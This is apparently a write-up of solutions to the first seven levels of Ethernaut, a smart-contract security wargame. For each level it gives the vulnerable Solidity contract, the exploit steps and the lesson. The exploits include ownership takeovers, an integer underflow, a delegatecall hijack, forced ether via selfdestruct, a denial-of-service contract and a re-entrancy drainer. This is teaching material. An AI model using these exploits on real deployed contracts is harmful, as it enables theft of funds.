# ethernaut_solutions

=========================

1. Fallback

=========================
    
    pragma solidity ^0.4.18;

    import 'zeppelin-solidity/contracts/ownership/Ownable.sol';

    contract Fallback is Ownable {

    mapping(address => uint) public contributions;

    function Fallback() {
        contributions[msg.sender] = 1000 * (1 ether);
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if(contributions[msg.sender] > contributions[owner]) {
          owner = msg.sender;
        }
    }

    function getContribution() public constant returns (uint) {
        return contributions[msg.sender];
    }

    function withdraw() onlyOwner {
        owner.transfer(this.balance);
    }

    function() payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
            owner = msg.sender;
        }
    }

=========================

###Goal
	
* you claim ownership of the contract
* you reduce its balance to 0

=========================

### Solution

* Make a contribution
    * contract.contribution({value:1})
* Confirm contribution is successful
	* (await contract.getContribution()).toNumber()
* Call the fallback function by sending ether to the contract
	* await sendTransaction({to:instance, value:fromWei(2)})
* Confirm we are now indeed the owner
	* await contract.owner()
* Withdraw our funds
	* contract.withdraw()

=========================

### Message on completion:

You know the basics of how ether goes in and out of contracts, including the usage of the fallback method.

You've also learnt about OpenZeppelin's Ownable contract, and how it can be used to restrict the usage of some methods to a priviledged address.

Move on to the next level when you're ready!

=========================

2. Fallout

=========================
    
    pragma solidity ^0.4.18;

    import 'zeppelin-solidity/contracts/ownership/Ownable.sol';

    contract Fallout is Ownable {

        mapping (address => uint) allocations;

        /* constructor */
        function Fal1out() payable {
            owner = msg.sender;
            allocations[owner] = msg.value;
        }

        function allocate() public payable {
            allocations[msg.sender] += msg.value;
        }

        function sendAllocation(address allocator) public {
            require(allocations[allocator] > 0);
            allocator.transfer(allocations[allocator]);
        }

        function collectAllocations() public onlyOwner {
            msg.sender.transfer(this.balance);
        }

        function allocatorBalance(address allocator) public constant returns (uint) {
            return allocations[allocator];
        }
    }

=========================

###Goal
* Claim ownership of the contract below to complete this level.

=========================

### Solution

See the constructor? Notice something odd?

There's a 1 where there should be an l in "Fallout".

You can game this contract by doing the following:

Simply call the function labelled "constructor"

    await contract.Fal1out()

=========================

###Message on completion

That was silly wasn't it? Real world contracts must be much more secure than this and so must it be much harder to hack them right?

Well... Not quite.

The story of Rubixi is a very well known case in the Ethereum ecosystem. The company changed its name from 'Dynamic Pyramid' to 'Rubixi' but somehow they didn't rename the constructor method of its contract:

    contract Rubixi {
        address private owner;
        function DynamicPyramid() { owner = msg.sender; }
        function collectAllFees() { owner.transfer(this.balance) }
        ...

This allowed the attacker to call the old constructor and claim ownership of the contract, and steal some funds. Yep. Big mistakes can be made in smartcontractland.

=========================

3. Token

=========================

    pragma solidity ^0.4.18;

    contract Token {

        mapping(address => uint) balances;
        uint public totalSupply;

        function Token(uint _initialSupply) {
            balances[msg.sender] = totalSupply = _initialSupply;
        }

        function transfer(address _to, uint _value) public returns (bool) {
            require(balances[msg.sender] - _value >= 0);
            balances[msg.sender] -= _value;
            balances[_to] += _value;
            return true;
        }

        function balanceOf(address _owner) public constant returns (uint balance) {
            return balances[_owner];
        }
    }

=========================

###Goal
* You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.

=========================

### Solution

* Simply transfer 21 tokens to any address that is not the player address
    * await contract.transfer("0x0",21)
* Then check the balance afterwards
    * (await contract.balanceOf(player)).toNumber()
    * $ 1.157920892373162e+77
* That number should be the maximum uint256 can ever be!

=========================

###Message on completion

Overflows are very common in solidity and must be checked for with control statements such as:

    if(a + c > a) {
      a = a + c;
    }

An easier alternative is to use OpenZeppelin's SafeMath library that automatically checks for overflows in all the mathematical operators. The resulting code looks like this:

    a = a.add(c);

If there is an overflow, the code will revert.

=========================

4. Delegation

=========================

    pragma solidity ^0.4.18;

    contract Delegate {

        address public owner;

        function Delegate(address _owner) {
            owner = _owner;
        }

        function pwn() {
            owner = msg.sender;
        }
    }

    contract Delegation {

        address public owner;
        Delegate delegate;

        function Delegation(address _delegateAddress) {
            delegate = Delegate(_delegateAddress);
            owner = msg.sender;
        }

        function() {
            if(delegate.delegatecall(msg.data)) {
                this;
            }
        }
    }

=========================

###Goal
* Claim ownership of the instance you are given.

=========================

### Solution

Delegatecall is used here, meaning the given function is executed in the context of the calling site. 

In this case, if we pass in the function signature of pwn() in the message data, the pwn() function will execute, but as we are executing it in the context of the Delegation contract, we will be msg.sender, making us the new owner.

    await sendTransaction({to:instance, data:web3.sha3("pwn()")})

=========================

###Message on completion

Usage of delegatecall is particularly risky and has been used as an attack vector on multiple historic hacks. With it, you contract is practically saying "here, -other contract- or -other library-, do whatever you want with my state". Delegates have complete access to your contract's state. The delegatecall function is a powerful feature, but a dangerous one, and must be used with extreme care.
Please refer to the The Parity Wallet Hack Explained article for an accurate explanation of how this idea was used to steal 30M USD.

=========================

5. Force

=========================

    pragma solidity ^0.4.18;

    contract Force {/*

                       MEOW ?
             /\_/\   /
        ____/ o o \
      /~____  =ø= /
     (______)__m_m)

    */}

=========================

###Goal
* Make the balance of the contract greater than zero.

=========================

### Solution

We need a way to send ether to this contract, but there is no payable function.

Not to worry, selfdestruct is at hand. The selfdestruct method allows a contract to delete itself, and send any funds it may have before doing so.
    
    pragma solidity ^0.4.18;

    contract Thing {
        function sendToForce(address force) public payable {
            selfdestruct(force);
        }
    }

=========================

###Message on completion

In solidity, for a contract to be able to receive ether, the fallback function must be marked 'payable'.
However, there is no way to stop an attacker from sending ether to a contract by self destroying. Hence, it is important not to count on the invariant this.balance == 0 for any contract logic.

=========================

6. King

=========================

    pragma solidity ^0.4.18;

    import 'zeppelin-solidity/contracts/ownership/Ownable.sol';

    contract King is Ownable {

        address public king;
        uint public prize;

        function King() public payable {
            king = msg.sender;
            prize = msg.value;
        }

        function() external payable {
            require(msg.value >= prize || msg.sender == owner);
            king.transfer(msg.value);
            king = msg.sender;
            prize = msg.value;
        }
    }


=========================

###Goal

The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets payed the new prize, making a bit of ether in the process! As ponzi as it gets xD

Such a fun game. Your goal is to break it.
When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.

=========================

### Solution

We can assume the level retakes ownership by calling the fallback function, which transfers the previous king the given value, then sets the king to the new address.

We can break this by causing king.transfer() to fail, in which case it will throw and never allow a new king to be set!

This is possible if the address in the king variable is the address of a contract (not an external account), in which there is no payable fallback function.

In the KingBeater contract below we would first deploy it with some ether.

If we then call giveToKing, we cause the contracts balance to be sent to the fallback function on King, which will set KingBeater == King.


    contract KingBeater {
        
        function KingBeater() public payable {}
        
        function getBalance() public view returns (uint) {
            return this.balance;
        }
        
        function giveToKing(address theKing) public {
            theKing.call.gas(100000000).value(this.balance)("none", "King");
        }
    }

=========================

### Message on completion

Most of Ethernaut's levels try to expose (in an oversimpliefied form of course) something that actually happend. A real hack or a real bug.

In this case, see: King of the Ether and King of the Ether Postmortem.

=========================

7. Re-entrancy

=========================

    pragma solidity ^0.4.18;

    contract Reentrance {

        mapping(address => uint) public balances;

        function donate(address _to) public payable {
            balances[_to] += msg.value;
        }

        function balanceOf(address _who) public constant returns (uint balance) {
            return balances[_who];
        }

        function withdraw(uint _amount) public {
            if(balances[msg.sender] >= _amount) {
                if(msg.sender.call.value(_amount)()) {
                    _amount;
                }
                balances[msg.sender] -= _amount;
            }
        }

        function() payable {}
    }

=========================

### Goal
* Steal all the funds from the contract.

=========================

### Solution

The trick to this attack is to take advantage of the fact that call is used to transfer value in the withdraw function.

We should first instantiate the Attack contract with a value of 1 ether.

We should then call the donateToVictim function which calls executes the donate function in the Reentrance contract, topping up the balance.

If we now call the launchAttack function, it will then execute the withdraw function in the Reentrance contract, with an argument of 1 ether. Inside the withdraw function, we should pass the first conditional, then send the caller (the Attack contract in this case) the total given amount (again, 1 ether).

However, when our contract receives the ether, the fallback function is executed, which again calls the withdraw function...

This process continues itself until all ether has been withdrawn from the victim contract.

    contract Attack {
        
        address target;
        
        function Attack(address _target) public payable {
            target = _target;
        }
        
        function withdraw() public {
            msg.sender.transfer(this.balance);
        }
        
        function donateToVictim() public {
            Reentrance(target).donate.gas(100000000).value(this.balance)(this);
        }
        
        function launchAttack() public {
            Reentrance(target).withdraw(1 ether);
        }
        
        function() public payable {
            Reentrance(target).withdraw(1 ether);
        }
    }

=========================

### Message on completion

Use transfer to move funds out of your contract, since it throws and limits gas forwarded. Low level functions like call and send just return false but don't interrupt the execution flow when the receiving contract fails.
Always assume that the receiver of the funds you are sending can be another contract, not just a regular address. Hence, it can execute code in its payable fallback method and re-enter your contract, possibly messing up your state/logic.

Re-entrancy is a common attack. You should always be prepared for it!
 
*The DAO Hack*

The famous DAO hack used reentrancy to extract a huge amount of ether from the victim contract. See 15 lines of code that could have prevented TheDAO Hack.

=========================



